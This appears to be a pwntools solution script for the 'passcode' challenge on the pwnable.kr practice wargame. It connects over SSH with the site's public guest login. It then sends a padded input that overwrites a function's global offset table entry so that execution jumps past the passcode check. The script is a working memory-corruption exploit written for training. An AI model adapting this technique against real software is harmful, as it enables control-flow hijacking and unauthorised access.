from pwn import *

user ='passcode'
host = 'pwnable.kr'
password = 'guest'
port=2222

machine = ssh(user=user, host=host, password=password, port=port)

proc = machine.process("/home/passcode/passcode")
proc.sendline("A"*96 + p32(0x804a004))
proc.sendline(str(0x80485d7))
print proc.recvall()
